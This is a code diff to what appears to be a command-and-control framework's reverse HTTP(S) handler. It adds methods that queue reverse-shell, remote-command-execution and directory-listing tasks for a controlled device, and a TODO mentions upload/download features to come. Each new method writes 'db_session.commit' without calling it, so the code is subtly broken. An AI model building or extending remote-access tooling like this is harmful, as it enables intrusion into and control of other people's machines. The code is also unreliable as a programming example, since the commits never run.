@@ -1,6 +1,7 @@
 from datetime import datetime
+from uuid import uuid1
 from Handlers.base import BaseHandler
-from Database import db_session, DeviceModel
+from Database import db_session, DeviceModel, TasksModel
 
 class Handler(BaseHandler):
     """The Reverse Http(s) Handler Class to interact with the Device"""
@@ -13,3 +14,29 @@ class Handler(BaseHandler):
         if delta < 10:
             return True
         return False 
+    
+    
+    def reverse_shell(self, address: str, port: int, shell: str) -> TasksModel:
+        task = self.generate_task()
+        task.type = "reverse-shell"
+        task.args = [address, port, shell]
+        db_session.add(task)
+        db_session.commit
+        return task
+    
+    def rce(self, cmd: str) -> TasksModel:
+        task = self.generate_task()
+        task.type = "rce"
+        task.args = [cmd]
+        db_session.add(task)
+        db_session.commit
+        return task
+    
+    def get_directory_contents(self, dir: str) -> TasksModel:
+        task = self.generate_task()
+        task.type = "dir"
+        task.args = [dir]
+        db_session.add(task)
+        db_session.commit
+        return task
+    #TODO: add the other methods upload/download
